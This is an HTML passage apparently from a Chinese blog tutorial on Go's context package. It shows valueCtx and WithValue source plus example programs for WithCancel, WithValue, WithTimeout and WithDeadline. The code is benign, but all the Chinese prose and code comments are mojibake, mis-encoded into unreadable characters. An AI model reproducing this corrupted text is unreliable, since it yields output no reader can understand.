<p><code>c := &amp;timerCtx</code>ï¼šæ–°å»ºtimerCtxå¯¹è±¡ï¼Œdeadlineçš„å€¼ä¸ºä¼ å…¥çš„æˆªæ­¢æ—¶é—´ï¼Œcontextä½¿ç”¨ä¼ å…¥çš„è·ŸèŠ‚ç‚¹</p>
<p>ç¬¬åè¡Œï¼Œè°ƒç”¨propagateCancelå‡½æ•°ï¼Œå½“çˆ¶èŠ‚ç‚¹è¢«å–æ¶ˆæ—¶å–æ¶ˆå­èŠ‚ç‚¹</p>
<p><code> dur := time.Until(d)</code>ï¼šå¾—åˆ°ä¸€ä¸ªå½“å‰æ—¶é—´åˆ°dçš„æ—¶é—´å·®</p>
<p>å¦‚æœæˆªæ­¢æ—¶é—´å·²è¿‡ï¼Œåˆ™è°ƒç”¨cancelæ–¹æ³•ï¼Œå¹¶ä¼ å…¥è¶…è¿‡æˆªæ­¢æ—¶é—´çš„é”™è¯¯</p>
<p>å¦‚æœæ–°å»ºçš„contextçš„errä¸ºç©ºï¼Œåˆ™è¿”å›ä¸€ä¸ªæˆªæ­¢æ—¶é—´çš„è®¡æ—¶å™¨</p>
<h3 id="valuectx">valueCtx</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">type</span> <span class="nx">valueCtx</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="nx">Context</span>
   <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span> <span class="kd">interface</span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>valueCtxç»§æ‰¿äº†Context</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">valueCtx</span><span class="p">)</span> <span class="nf">String</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
   <span class="k">return</span> <span class="nf">contextName</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#34;.WithValue(type &#34;</span> <span class="o">+</span>
      <span class="nx">reflectlite</span><span class="p">.</span><span class="nf">TypeOf</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">key</span><span class="p">).</span><span class="nf">String</span><span class="p">()</span> <span class="o">+</span>
      <span class="s">&#34;, val &#34;</span> <span class="o">+</span> <span class="nf">stringify</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">val</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#34;)&#34;</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">valueCtx</span><span class="p">)</span> <span class="nf">Value</span><span class="p">(</span><span class="nx">key</span> <span class="kd">interface</span><span class="p">{})</span> <span class="kd">interface</span><span class="p">{}</span> <span class="p">{</span>
   <span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">key</span> <span class="o">==</span> <span class="nx">key</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">val</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Context</span><span class="p">.</span><span class="nf">Value</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>valueCtxå®ç°äº†Stringå’ŒValueæ–¹æ³•</p>
<p>valueæ–¹æ³•è¿”å›keyçš„valï¼Œå¦‚æœå½“å‰èŠ‚ç‚¹ä¸å­˜åœ¨ï¼Œåˆ™æŸ¥æ‰¾ä¸Šä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªé€’å½’æ“ä½œ</p>
<p>ä½¿ç”¨WithValueå‡½æ•°æ¥åˆ›å»ºvalueCtx</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">WithValue</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span> <span class="kd">interface</span><span class="p">{})</span> <span class="nx">Context</span> <span class="p">{</span>
   <span class="k">if</span> <span class="nx">key</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
      <span class="nb">panic</span><span class="p">(</span><span class="s">&#34;nil key&#34;</span><span class="p">)</span>
   <span class="p">}</span>
   <span class="k">if</span> <span class="p">!</span><span class="nx">reflectlite</span><span class="p">.</span><span class="nf">TypeOf</span><span class="p">(</span><span class="nx">key</span><span class="p">).</span><span class="nf">Comparable</span><span class="p">()</span> <span class="p">{</span>
      <span class="nb">panic</span><span class="p">(</span><span class="s">&#34;key is not comparable&#34;</span><span class="p">)</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="o">&amp;</span><span class="nx">valueCtx</span><span class="p">{</span><span class="nx">parent</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span><span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å®˜æ–¹çš„æ³¨é‡Šå†™çš„æ˜¯è¿”å›çˆ¶é¡¹çš„å‰¯æœ¬ï¼Œkeyå¿…é¡»å¯ä»¥æ¯”è¾ƒï¼Œä¸èƒ½ä¸ºstringç±»å‹(stringå¯ä»¥æ¯”è¾ƒå§ï¼Œè€Œä¸”æˆ‘è¯•äº†stringä¹Ÿå¯ä»¥å•ŠğŸ˜¥)æˆ–è€…å…¶å®ƒå†…ç½®ç±»å‹ï¼Œé¿å…ä½¿ç”¨ä¸Šä¸‹æ–‡åœ¨ç¨‹åºåŒ…ä¹‹é—´å‘ç”Ÿå†²çª</p>
<h2 id="ä½¿ç”¨context">ä½¿ç”¨Context</h2>
<p>contextçš„æ ¹èŠ‚ç‚¹ä½¿ç”¨context.Background()å‡½æ•°æ¥åˆ›å»ºï¼Œä¸Šé¢ä¹Ÿæœ‰å†™åˆ°ï¼ŒBackgroundå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªemptyCtxï¼Œä¸€ä¸ªç©ºçš„contextï¼Œä¸èƒ½è¢«å–æ¶ˆï¼Œæ²¡æœ‰å€¼ä¹Ÿæ²¡æœ‰è¶…æ—¶æ—¶é—´</p>
<p>åˆ›å»ºå­èŠ‚ç‚¹çš„æ–¹æ³•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">func</span> <span class="nf">WithCancel</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">)</span> <span class="p">(</span><span class="nx">ctx</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">cancel</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
<span class="kd">func</span> <span class="nf">WithValue</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span> <span class="kd">interface</span><span class="p">{})</span> <span class="nx">Context</span> <span class="p">{</span>
<span class="kd">func</span> <span class="nf">WithTimeout</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">timeout</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">)</span> <span class="p">(</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
<span class="kd">func</span> <span class="nf">WithDeadline</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">d</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Time</span><span class="p">)</span> <span class="p">(</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
</code></pre></td></tr></table>
</div>
</div><p>ä¸€ä¸ªä¸€ä¸ªæ¥å†™ä¸€ä¸‹</p>
<h3 id="withcancel">WithCancel</h3>
<p>WithCancel ä¼ å…¥ä¸€ä¸ªcontextçš„æ ¹èŠ‚ç‚¹ï¼Œè¿”å›ä¸€ä¸ªcontextçš„å‰¯æœ¬ï¼Œå’Œä¸€ä¸ªcancelæ–¹æ³•</p>
<p>contextçš„å‰¯æœ¬ç”¨äºä¼ å…¥åˆ°å­goroutineä¸­</p>
<p>cancelç”¨äºé€šçŸ¥å­goroutineå…³é—­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;context&#34;</span>
   <span class="s">&#34;fmt&#34;</span>
   <span class="s">&#34;sync&#34;</span>
   <span class="s">&#34;time&#34;</span>
<span class="p">)</span>

<span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="nf">Work</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Work</span><span class="p">()</span> <span class="p">{</span>
   <span class="nx">ctx</span><span class="p">,</span> <span class="nx">cancel</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithCancel</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">())</span>
   <span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
   <span class="k">go</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span> <span class="c1">//å¼€å¯ä¸€ä¸ªå­goroutineï¼Œå¹¶æŠŠè¿”å›çš„contextçš„å‰¯æœ¬ä¼ å…¥
</span><span class="c1"></span>   <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
   <span class="nf">cancel</span><span class="p">()</span> <span class="c1">//è°ƒç”¨cancelå…³é—­context.doneï¼Œå­goroutineé€šè¿‡select ctx.Doneæ¥å…³é—­è¿›ç¨‹
</span><span class="c1"></span>   <span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>

    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;loading...&#34;</span><span class="p">)</span>
	<span class="c1">// ç­‰å¾…å‘å‡ºå…³é—­ä¿¡å·
</span><span class="c1"></span>    <span class="k">for</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;wait...&#34;</span><span class="p">)</span>
        <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
        <span class="k">select</span> <span class="p">{</span>
            <span class="k">case</span> <span class="o">&lt;-</span><span class="nx">ctx</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span> <span class="c1">//å½“cancelè¢«è°ƒç”¨æ—¶ï¼Œcontext.doneä¼šè¢«å…³é—­ï¼Œè¿™é‡Œä¼šselectåˆ°ctx.Doneçš„é›¶å€¼
</span><span class="c1"></span>            <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done close&#34;</span><span class="p">)</span>
            <span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
            <span class="k">return</span>
        <span class="k">default</span><span class="p">:</span>
            <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done not close&#34;</span><span class="p">)</span>
        <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="withvalue">WithValue</h3>
<p>è¯¥å‡½æ•°å°†ä¼ å…¥çš„é”®å€¼å¯¹ä¼ å…¥åˆ°æ ¹èŠ‚ç‚¹</p>
<p>ä¼ å…¥ä¸€ä¸ªæ ¹èŠ‚ç‚¹ï¼Œå’Œkvå¯¹ï¼Œkå¿…é¡»æ˜¯å¯ä»¥æ¯”è¾ƒçš„ï¼Œè¿”å›ä¸€ä¸ªcontextçš„å‰¯æœ¬ï¼Œç”¨äºä¼ å…¥å­goroutine</p>
<p>ä¸€ä¸ªç®€å•çš„ä¾‹å­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;context&#34;</span>
   <span class="s">&#34;fmt&#34;</span>
<span class="p">)</span>


<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="nf">Work</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Work</span><span class="p">()</span> <span class="p">{</span>
   <span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithValue</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#34;a&#34;</span><span class="p">)</span>
   <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">id</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nf">Value</span><span class="p">(</span><span class="mi">1</span><span class="p">).(</span><span class="kt">string</span><span class="p">)</span> <span class="c1">//å¦‚æœæ‰¾åˆ°äº†ä¸º1çš„keyï¼Œåˆ™è¿”å›1çš„valå’Œok
</span><span class="c1"></span>   <span class="k">if</span> <span class="nx">ok</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;work id 1 is val: %s&#34;</span><span class="p">,</span> <span class="nx">id</span><span class="p">)</span>
   <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;not work id 1\n&#34;</span><span class="p">)</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="withtimeout">WithTimeout</h3>
<p>ä¼ å…¥ä¸€ä¸ªcontextæ ¹èŠ‚ç‚¹å’Œä¸€ä¸ªæ—¶æ®µ</p>
<p>è¿”å›ä¸€ä¸ªcontextæ ¹èŠ‚ç‚¹çš„å‰¯æœ¬å’Œä¸€ä¸ªcancel</p>
<p>contextæ ¹èŠ‚ç‚¹çš„å‰¯æœ¬ç”¨äºä¼ å…¥å­goroutineï¼Œcancelç”¨äºé€šçŸ¥å­goroutineå…³é—­</p>
<p>ä¸€ä¸ªç®€å•çš„ä¾‹å­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;context&#34;</span>
   <span class="s">&#34;fmt&#34;</span>
   <span class="s">&#34;sync&#34;</span>
   <span class="s">&#34;time&#34;</span>
<span class="p">)</span>

<span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="nf">Work</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Work</span><span class="p">()</span> <span class="p">{</span>
   <span class="nx">ctx</span><span class="p">,</span> <span class="nx">cancel</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithTimeout</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span>

   <span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
   <span class="k">go</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span>
   <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
   <span class="nf">cancel</span><span class="p">()</span> <span class="c1">//å¦‚æœå·¥ä½œå·²ç»å®Œæ¯•äº†ï¼Œä½†æ˜¯æ—¶é—´è¿˜æ²¡åˆ°ï¼Œå¯ä»¥è°ƒç”¨cancelæ¥å…³é—­
</span><span class="c1"></span>   <span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;wait...&#34;</span><span class="p">)</span>
      <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
      <span class="k">select</span> <span class="p">{</span>
      <span class="k">case</span> <span class="o">&lt;-</span><span class="nx">ctx</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done close&#34;</span><span class="p">)</span>
         <span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
         <span class="k">return</span>
      <span class="k">default</span><span class="p">:</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done not close&#34;</span><span class="p">)</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="withdeadline">WithDeadline</h3>
<p>è·ŸWithTimeoutå¾ˆç›¸ä¼¼</p>
<p>ä¼ å…¥ä¸€ä¸ªcontextæ ¹èŠ‚ç‚¹å’Œä¸€ä¸ªæœªæ¥æ—¶é—´ç‚¹ï¼Œè¿”å›ä¸€ä¸ªcontextæ ¹èŠ‚ç‚¹çš„å‰¯æœ¬å’Œcancel</p>
<p>contextçš„å‰¯æœ¬ç”¨äºä¼ å…¥å­goroutineï¼Œcancelç”¨äºé€šçŸ¥å­goroutineå…³é—­</p>
<p>ä¸€ä¸ªç®€å•çš„ä¾‹å­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;context&#34;</span>
   <span class="s">&#34;fmt&#34;</span>
   <span class="s">&#34;sync&#34;</span>
   <span class="s">&#34;time&#34;</span>
<span class="p">)</span>

<span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="nf">Work</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Work</span><span class="p">()</span> <span class="p">{</span>
   <span class="nx">d</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">Add</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">5</span><span class="p">)</span> <span class="c1">//å®šä¹‰ä¸€ä¸ªæœªæ¥æ—¶é—´ç‚¹
</span><span class="c1"></span>   <span class="nx">ctx</span><span class="p">,</span> <span class="nx">cancel</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithDeadline</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="nx">d</span><span class="p">)</span>

   <span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
   <span class="k">go</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span>
   <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
   <span class="k">defer</span> <span class="nf">cancel</span><span class="p">()</span> <span class="c1">//å¦‚æœå·¥ä½œå·²ç»å®Œæ¯•äº†ï¼Œä½†æ˜¯æ—¶é—´è¿˜æ²¡åˆ°ï¼Œå¯ä»¥è°ƒç”¨cancelæ¥å…³é—­
</span><span class="c1"></span>   <span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;wait...&#34;</span><span class="p">)</span>
      <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
      <span class="k">select</span> <span class="p">{</span>
      <span class="k">case</span> <span class="o">&lt;-</span><span class="nx">ctx</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done close&#34;</span><span class="p">)</span>
         <span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
         <span class="k">return</span>
      <span class="k">default</span><span class="p">:</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done not close&#34;</span><span class="p">)</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="æ€»ç»“">æ€»ç»“</h2>
<p>åƒ <code>WithCancel</code>ã€<code>WithDeadline</code>ã€<code>WithTimeout</code>ã€<code>WithValue</code> è¿™äº›åˆ›å»ºå‡½æ•°</p>
<p>å®é™…ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ªä¸ªçš„é“¾è¡¨ç»“ç‚¹è€Œå·²ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œå¯¹é“¾è¡¨çš„æ“ä½œï¼Œé€šå¸¸éƒ½æ˜¯ <code>O(n)</code> å¤æ‚åº¦çš„ï¼Œæ•ˆç‡ä¸é«˜ã€‚</p>
<p>é‚£ä¹ˆï¼Œcontext åŒ…åˆ°åº•è§£å†³äº†ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ï¼š<code>cancelation</code>ã€‚ä»…ç®¡å®ƒå¹¶ä¸å®Œç¾ï¼Œä½†å®ƒç¡®å®å¾ˆç®€æ´åœ°è§£å†³äº†é—®é¢˜ã€‚</p>
<p>&ndash;æ‘˜è‡ªï¼š<code>https://qcrao.com/2019/06/12/dive-into-go-context/</code></p>
<ul>
<li>åœ¨ä½¿ç”¨ä¸­å¯¹å®¹æ˜“é€ æˆå†…å­˜æ³„æ¼çš„åœ°æ–¹ï¼Œè¦ç‰¹åˆ«æ³¨æ„cancelçš„è°ƒç”¨</li>
</ul>
<h2 id="å­¦ä¹ èµ„æ–™">å­¦ä¹ èµ„æ–™</h2>
<p>Go SDK 1.14.4 context</p>
<p><a href="https://qcrao.com/2019/06/12/dive-into-go-context/">https://qcrao.com/2019/06/12/dive-into-go-context/</a></p>
